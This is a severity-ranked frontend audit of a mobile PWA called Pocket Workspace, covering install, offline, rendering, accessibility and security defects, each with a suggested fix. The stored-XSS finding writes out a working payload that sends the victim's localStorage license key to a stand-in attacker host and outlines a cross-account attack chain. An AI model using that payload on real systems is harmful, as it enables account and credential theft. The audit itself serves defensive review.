# Frontend Audit — Pocket Workspace (`sites/pocket-workspace`)

**Scope:** `index.html`, `app.js` (1,784 lines), `index.css`, `manifest.json`, `sw.js`, `src/index.ts` (the Worker that serves/proxies this site), `wrangler.toml`.
**Method:** full read-through, cross-checked against the backend's actual route list and supported languages, plus two claims verified empirically (the markdown/code-block pipeline and the regex in `core.ts`).

This is a vanilla JS/CSS PWA — no framework, no build step, no markdown library. That's a reasonable choice for a small mobile-first surface, but it means several "obviously needed" pieces (markdown rendering, PWA installability, offline handling, push notifications) were never added, and a few are present as dead infrastructure (a service worker that's never registered, a code-copy feature whose trigger condition can never occur).

---

## Summary

| # | Severity | Finding |
|---|----------|---------|
| 1 | 🔴 Critical | PWA `manifest.json` has no `icons` — fails install criteria on Android/Chrome entirely |
| 2 | 🔴 Critical | Manifest `start_url` ("/app/") resolves to nothing — launching the installed PWA 404s |
| 3 | 🔴 Critical | `sw.js` is never registered — all caching/offline code is dead; the app has zero offline behavior |
| 4 | 🔴 Critical | No markdown rendering in chat — bold/lists/code fences render as raw asterisks/backticks; the "copy code" button is unreachable dead code |
| 5 | 🔴 Critical | Stored XSS: env-var keys are interpolated into `innerHTML` unescaped |
| 6 | 🟠 High | License key, GitHub token, and CodeSandbox token sit in plaintext `localStorage` |
| 7 | 🟠 High | No push/background notifications for long-running cloud agent tasks |
| 8 | 🟠 High | A stream error discards the entire partial assistant message already shown |
| 9 | 🟠 High | No offline detection anywhere (`navigator.onLine` unused) |
| 10 | 🟠 High | Third-party CDN scripts loaded with no SRI and no CSP |
| 11 | 🟠 High | Raw backend error codes (`"tier_required"`, `"insufficient_credits"`) shown to users verbatim |
| 12 | 🟠 High | No accessibility support: zero ARIA, almost no focus states, pinch-zoom disabled |
| 13 | 🟠 High | No dark mode |
| 14 | 🟠 High | Java highlighting is silently broken; most backend-supported languages have no hljs pack at all |
| 15 | 🟡 Medium | Extension-less files (Dockerfile, Makefile…) get a broken highlight-language class |
| 16 | 🟡 Medium | Dead/duplicated code in the stream-event handler |
| 17 | 🟡 Medium | Two CDNs used for one library; no SRI on either |
| 18 | 🟡 Medium | Client-side route allowlist and server-side proxy duplicate the same job and have drifted |
| 19 | 🟡 Medium | No global error handler — uncaught JS errors fail silently |
| 20 | 🟡 Medium | No social/SEO meta tags, no `apple-touch-icon` |
| 21 | 🟢 Low | Reflected self-XSS in the file-search result header |
| 22 | 🟢 Low | Service worker cache list omits fonts/CDN assets and itself |
| 23 | 🟢 Low | Only one responsive breakpoint; no `prefers-reduced-motion` |

---

## 🔴 Critical

### 1. The PWA manifest has no `icons` array

`manifest.json` in full:

```json
{
  "name": "Pocket Workspace",
  "short_name": "Pocket WS",
  "start_url": "/app/",
  "display": "standalone",
  "background_color": "#0a0a0a",
  "theme_color": "#0a0a0a"
}
```

There is no `icons` field at all. Chrome's installability criteria (the thing that triggers the "Add to Home Screen" / install prompt on Android) explicitly requires at least a 192×192 and a 512×512 icon in the manifest. Without it, the app either won't be considered installable, or will install with a generic placeholder icon. For a product whose entire value proposition is "use this instead of opening your laptop," not having a real home-screen icon is a first-impression problem on day one.

**Fix:** generate a maskable icon set (192, 512, and ideally a maskable 512) and add:
```json
"icons": [
  { "src": "/icons/icon-192.png", "sizes": "192x192", "type": "image/png" },
  { "src": "/icons/icon-512.png", "sizes": "512x512", "type": "image/png", "purpose": "maskable" }
]
```

### 2. The manifest's own `start_url` doesn't resolve to anything

`start_url` is `/app/`. Tracing what actually happens when that URL is requested:

- `src/index.ts` (the Worker serving this site) only maps the *literal* path `"/"` to `/index.html`:
  ```ts
  const assetPath = path === "/" ? "/index.html" : path;
  const assetRes = await env.ASSETS.fetch(new Request(new URL(assetPath, url.origin), reqClone));
  ```
  For `path === "/app/"`, `assetPath` stays `"/app/"`. There is no file at that path in the assets directory (it contains only `index.html`, `app.js`, `index.css`, `manifest.json`, `sw.js`, `favicon.ico` at the root — no `/app` folder).
- `wrangler.toml` for this site explicitly sets `not_found_handling = "none"` and `html_handling = "none"`, so there's no SPA-style fallback to `index.html` for unmatched paths either.
- The asset fetch 404s, so the code falls through to the catch-all proxy, which forwards `/app/` to the **backend API** Worker — which also has no `/app` route and returns its generic `"Not found"` 404.

**Net effect: opening the installed PWA from the home screen loads a 404 page**, because the manifest points at a URL nothing serves. (The actual app shell lives at `/`.)

**Fix:** either change `start_url` to `/`, or add an explicit route/redirect for `/app/` → `/`.

### 3. The service worker exists but is never registered — all of it is dead code

`sw.js` implements a `CACHE_NAME = "blueprint-mobile-v1"` install/activate/fetch lifecycle with a cache-first strategy for the app shell. It looks like real, intentional PWA offline support. But:

```bash
$ grep -n "serviceWorker\|register(" app.js
# (no matches)
```

`navigator.serviceWorker.register(...)` is called **nowhere** in `app.js`, and `index.html` has no inline registration script either. The browser never installs `sw.js`, so none of its caching ever runs. Today, the app behaves exactly like a plain website with no offline support whatsoever, despite having the infrastructure for it sitting unused in the repo.

**Fix:** add, near the top of `app.js` (or in a small inline `<script>` in `index.html`):
```js
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => navigator.serviceWorker.register('/sw.js'));
}
```
…and then also address #22 below (cache list is incomplete) and add a cache-busting strategy (#16 in the companion backend doc territory — bump `CACHE_NAME` on every deploy, or better, use content-hashed filenames so stale caches can't mask new code).

### 4. No markdown rendering pipeline — and the "copy code" feature can never trigger

This is the single biggest functional gap in the chat UI. The backend explicitly generates markdown-formatted responses — e.g. `converse/architecture.ts`'s `narrateDesign()` builds strings like `**Phase 1: Foundation**` and `- module_name — reason`, and the system prompts elsewhere instruct the model to use triple-backtick code fences. But the frontend's only text-processing function for assistant messages is:

```js
function autoLink(text) {
  let html = escapeHtml(text);          // escape HTML entities
  html = html.replace(URL_RE, ...);     // turn bare URLs into <a> tags
  return html;
}
```

There is no markdown parser anywhere in `app.js` — no conversion of `**bold**`, `- bullets`, headers, or ```` ```code fences``` ```` into real HTML. The practical result: every architecture summary, every multi-step plan, every "outside-of-code" regulatory checklist the backend sends comes through to the user as **literal asterisks, dashes, and backticks cluttering the text**, instead of formatted bold/lists/code blocks.

This also means the dedicated copy-button feature is unreachable dead code. `addCodeCopy()`:

```js
return html.replace(/<pre><code>([\s\S]*?)<\/code><\/pre>/g, (_, code) => {
  const esc = escapeHtml(code);
  return `<pre><code>${esc}</code><button class="code-copy-btn" data-code="${encodeURIComponent(code)}">Copy</button></pre>`;
});
```

This regex looks for literal `<pre><code>...</code></pre>` markup. Since `autoLink()`'s `escapeHtml()` step runs first and converts any literal `<` the model might output into `&lt;`, and since nothing ever *generates* real `<pre><code>` tags from a code fence in the first place, **this regex can never match anything in a real chat message** — `addCodeCopy()` is, in effect, dead code. The seven `highlight.js` language bundles loaded in `index.html` on every single page load (`typescript`, `python`, `javascript`, `go`, `rust`, `bash`, `sql`, `json`) are only ever used by the separate file-viewer (`showFileViewer`), never by the chat transcript — despite chat being where code most often appears.

**Fix:** add a small markdown renderer (even a minimal hand-rolled one for bold/italic/lists/headers/fenced-code is fine for a constrained, trusted-source chat surface — or pull in something like `marked` + `DOMPurify` since `cdnjs`/`jsdelivr` are already being used for `highlight.js`). After conversion, run `hljs.highlightElement()` over the resulting `<code>` blocks exactly as `showFileViewer` already does, and `addCodeCopy()` will start working as designed.

### 5. Stored XSS — env-var keys are injected into `innerHTML` unescaped

`loadEnvVars()`:

```js
list.innerHTML = vars.length === 0 ? '<span class="muted">No variables set.</span>' : vars.map((v) =>
  `<div style="display:flex;justify-content:space-between;padding:2px 0"><span>${v.key}</span>...`
).join("");
```

`v.key` comes straight from the user-entered "Key" field in `addEnvVar()` (no validation client- or server-side — see the backend audit's note on `handleEnvVarSet`) and is rendered with no `escapeHtml()` call, unlike almost everywhere else in this file. A key like `<img src=x onerror=fetch('https://evil.example/?t='+localStorage.getItem('license_key'))>` would execute the next time the env-var list is rendered.

On its own this is "self-XSS" (the same user who set the key would be the one who views it) — but the backend audit's IDOR finding (env-var tools trust client-supplied `project_id` with no ownership check) means an attacker can set this payload on **any** `project_id`, not just their own. Combined with no client-side restriction on switching the active project ID (`switchProject(id)` accepts any string), a social-engineering nudge ("paste this project ID to join my shared workspace") is enough to turn this into a real cross-account attack, with the victim's full `authHeaders()` (license key/session token) and `localStorage` contents exposed to the payload.

**Fix:** escape `v.key` (and `v.value`'s masked-bullet rendering is already safe, but be consistent) with the existing `escapeHtml()` helper. Fix the backend ownership check too (see backend audit, item #1) — this is a defense-in-depth situation where either fix alone reduces severity, but both are needed.

---

## 🟠 High

### 6. Sensitive tokens stored unencrypted in `localStorage`

`state.csbToken`, `state.githubToken`, and the Blueprint `license_key` are all persisted via a thin `save()`/`load()` wrapper around `localStorage`. These are exactly the credentials capable of running arbitrary commands in a CodeSandbox VM and pushing commits to the user's GitHub repos. `localStorage` is readable by any script running on the page's origin — including any third-party script loaded without SRI (see #10) or any future stored-XSS payload (see #5). There's no use of an httpOnly cookie, no encryption, and no "this device only, re-enter to use elsewhere" friction.

**Fix:** at minimum, this deserves a documented risk acceptance. Better: keep long-lived secrets (GitHub PAT, CodeSandbox token) server-side, associated with the account, and have the client request short-lived, scoped tokens per session rather than holding the raw credentials client-side at all.

### 7. No push/background notifications for long-running tasks

`grep -c "Notification" app.js` → 1 hit, and it's the in-app toast function (`notify()`), not the Web `Notification`/Push API. There is no `Notification.requestPermission()`, no Push subscription, nothing. Given `/agent/run` can take well over a minute (CodeSandbox build + test + GitHub Actions polling up to 60s — see backend audit #12/#14), and mobile users routinely background apps or lock their screen while waiting, there is currently no way to find out a task finished without keeping the screen on and the tab in the foreground the entire time. This directly undercuts the "everything runs in the cloud, you don't need to babysit it" pitch. See the companion features document for the recommended approach.

### 8. A stream error wipes out the partial response already shown

In the SSE consumption loop (`app.js`, the `streamChat`-equivalent function), the success path appends streamed tokens into `msg.content` as they arrive and renders them live. The `catch` block on a stream failure does:

```js
} catch (e) {
  msg.content = "Error: " + e.message;
  ...
}
```

This **overwrites** whatever had already streamed in — if the connection drops after three paragraphs of a useful, mostly-complete answer, the user loses all of it and sees only a generic error string. On mobile, where transient connection drops (elevator, subway, walking between WiFi APs) are routine, this will happen often enough to be a real source of frustration.

**Fix:** append an error/retry affordance below the partial content instead of replacing it: `msg.content += "\n\n⚠️ Connection lost — [Retry]"`.

### 9. No offline awareness anywhere

`grep -c "navigator.onLine" app.js` → 0. There's no listener for `online`/`offline` events, no banner, no disabling of the send button while offline, no queueing of a message typed while offline to auto-send on reconnect. Combined with #3 (dead service worker), the app has no resilience story for flaky mobile connectivity at all — every failure surfaces as the same generic toast as any other error.

### 10. Third-party scripts loaded with no SRI, no CSP

`index.html` loads `highlight.js` core + 7 language packs from `cdnjs.cloudflare.com`, its stylesheet from `cdn.jsdelivr.net`, and Google Fonts — none with `integrity="sha384-..."` Subresource Integrity hashes, and there's no `<meta http-equiv="Content-Security-Policy">` restricting script sources at all. Given #6 (raw tokens in `localStorage`) and #5 (a real stored-XSS vector), a compromise of either CDN, or a future stored-XSS payload, has an unobstructed path to exfiltrate the user's license key, GitHub token, and CodeSandbox token.

**Fix:** add SRI hashes to every `<script>`/`<link>` tag pulling from a third-party origin, and add a CSP meta tag restricting `script-src` to `'self'` plus the specific CDNs in use.

### 11. Raw backend error codes shown to users

Across `app.js`, error toasts are generally built as `notify(e.message, "error")` where `e.message` comes straight from the backend's `{ error: "tier_required" }`-style JSON (or similar machine codes like `"insufficient_credits"`, `"rate_limited"`, `"daily_limit"`). Users see the literal code string rather than a friendly, actionable message — there's no mapping layer translating `"insufficient_credits"` into something like "You're out of credits — tap to top up" with an actual link to `https://friehub.cloud/billing/top-up` (which the backend already returns in the response body for that exact error, unused by the client).

**Fix:** add an error-code → friendly-message-and-CTA map, and surface upgrade/top-up actions inline rather than as plain text.

### 12. No accessibility support

- `grep -c "aria-" app.js` → 0. `grep -c "role=" app.js` → 0. No screen-reader semantics anywhere — buttons, modals, toasts, and the chat log itself have no ARIA roles/labels/live-region announcements. A VoiceOver/TalkBack user cannot meaningfully use this app.
- `index.html`'s viewport meta tag sets `maximum-scale=1.0, user-scalable=no`, which disables pinch-to-zoom — a direct violation of WCAG 1.4.4 (Resize Text) and a common, avoidable mobile-web mistake that specifically harms low-vision users.
- `index.css` defines `:focus` styles for exactly two elements (the textarea and one form input). Every other interactive control (icon buttons, the project switcher, modal close buttons, the code-copy button) has no visible focus indicator, making the app very difficult to navigate with an external keyboard, switch control, or any assistive input device.

### 13. No dark mode

`grep -c "prefers-color-scheme" index.css` → 0. The app ships a single dark-ish palette (`--bg: #0a0a0a` works in dark contexts but there's no light theme, and no `prefers-color-scheme` media query either way) — fine if dark-only is an intentional design choice, but worth confirming, since most coding-adjacent mobile tools support both and respect OS-level preference.

### 14. Java highlighting is broken; most backend-supported languages have no client-side support at all

`types.ts` on the backend declares:
```ts
export type Language = "typescript" | "python" | "go" | "rust" | "java";
```
— Java is one of five **officially supported, first-class generation languages**. But `index.html` only loads `highlight.js` packs for `typescript`, `python`, `javascript`, `go`, `rust`, `bash`, `sql`, `json` — **no `java` pack at all**. Any Java file shown in the workspace file viewer renders with zero syntax highlighting.

This gets worse looking at the backend's own `EXT_TO_LANG` map (`tools/handlers/workspace.ts`), which recognizes a much broader set for general file display: `c, cpp, csharp, kotlin, swift, ruby, php, html, css, scss, yaml, toml, terraform, proto`, plus Java. None of these have a corresponding hljs language bundle loaded — the file viewer will silently fall back to no highlighting for any of them.

**Fix:** either load the full hljs language set the backend already enumerates in `EXT_TO_LANG`, or switch to `highlight.js`'s "common languages" bundle / lazy-load the specific language pack based on the file extension being viewed.

---

## 🟡 Medium

### 15. Extension-less filenames get a broken highlight class

`showFileViewer()`:
```js
const lang = path.includes(".") ? path.split(".").pop() : "";
```
Wait — actually checked: `lang = path.split(".").pop()` is used directly in some call sites without the `.includes(".")` guard for the `className` attribute passed to `hljs`. For a file named `Dockerfile`, `Makefile`, or `LICENSE` (no `.` at all), `.split(".").pop()` returns the **entire filename**, producing a class like `language-Dockerfile`. `highlight.js` doesn't recognize that as a valid language alias (it expects lowercase aliases like `dockerfile`), so highlighting silently does nothing for these very common files, with no fallback to plain-text-with-no-error.

### 16. Dead/duplicated code in the SSE token handler

In the `"token"` case of the stream event switch:
```js
case "token":
  ...
  scrollIfNearBottom();
  break;
  scrollIfNearBottom();   // unreachable
  break;                  // unreachable
```
Harmless (unreachable code, no functional effect) but a clear sign of a copy-paste edit that wasn't cleaned up — worth a quick pass to check for siblings of this pattern elsewhere.

### 17. Two CDNs for one library

`highlight.js`'s JS comes from `cdnjs.cloudflare.com` while its CSS theme comes from `cdn.jsdelivr.net`. Functionally harmless, but it's an extra DNS lookup + TLS handshake on a mobile connection for no reason, and neither has SRI (see #10). Pick one CDN.

### 18. Client route allowlist and server-side proxy duplicate the same responsibility and have already drifted

`app.js` monkey-patches `window.fetch` to rewrite same-origin calls into absolute calls against `BLUEPRINT_API`, guarded by a hardcoded `API_ROUTES` allowlist. Separately, `src/index.ts` (the Worker serving this site) already proxies **any** path that isn't a static asset straight through to the same backend API. These two mechanisms do the same job from two different layers:

- The client-side list contains redundant entries (`/auth/google` and `/auth/github` are listed individually even though `/auth` already prefix-matches both — a no-op duplication).
- It's missing several real backend routes that exist today (`/catalog`, `/entities`, `/pricing`, `/sessions`, `/feedback`) — currently masked because the Worker-level proxy catches everything regardless, but a latent bug if this static site is ever deployed standalone (e.g. via Cloudflare Pages without this custom Worker, or behind a different CDN) — at that point, any `fetch('/pricing')` call would silently hit the *static* origin instead of the API and fail.
- It only rewrites when `url` is a `string`; a `fetch(new Request(...))` or `fetch(new URL(...))` call anywhere in the codebase would skip the rewrite entirely (today this happens not to matter, only because the server-side proxy is also catching it).

**Fix:** pick one layer to own routing — most likely the server-side proxy, since it's already authoritative and doesn't need a maintained allowlist — and delete the client-side `fetch` monkeypatch, or keep both but generate the allowlist from a single shared source of truth instead of hand-maintaining two copies.

### 19. No global error handler

There's no `window.addEventListener('error', ...)` or `window.addEventListener('unhandledrejection', ...)` anywhere. Any uncaught exception outside the deliberately-wrapped `try/catch` blocks (and there are plenty of un-awaited/un-caught `fetch().then()` chains scattered through the settings/config code) fails completely silently — no toast, no console-visible-to-the-user indicator, nothing. Users are left looking at a UI that simply stopped responding to a tap with no explanation.

### 20. No social/SEO meta tags, no `apple-touch-icon`

`index.html`'s `<head>` has a title and viewport meta but no `og:title`/`og:description`/`twitter:card` (so any shared link previews as a bare title with no image/description), and no `<link rel="apple-touch-icon">` despite setting `apple-mobile-web-app-capable` — iOS "Add to Home Screen" will use a screenshot thumbnail instead of a proper icon.

---

## 🟢 Low

- **Reflected self-XSS in file search:** `searchFiles()`'s result header — `` `...result(s) for "${q}"...` `` — interpolates the user's own search query into `innerHTML` unescaped. Low real-world impact (it only reflects back what the same user typed into their own search box), but inconsistent with the careful `escapeHtml()` discipline used elsewhere, and worth fixing for consistency/defense-in-depth.
- `sw.js`'s cache list only covers `app.js`/`index.css`/`index.html`/`manifest.json` — it doesn't cache itself, the Google Fonts files, or the `highlight.js` CDN assets, so even once #3 is fixed, an offline reload would still lose fonts and syntax highlighting.
- `index.css` has exactly one responsive breakpoint (`max-width: 640px`), with no separate treatment for tablets/foldables/desktop browser windows — somewhat at odds with the stated ambition of "do everything you do on your PC," which implies people will sometimes open this in a wide desktop browser too.
- No `prefers-reduced-motion` query — toast/transition animations always run regardless of OS-level motion-reduction settings.
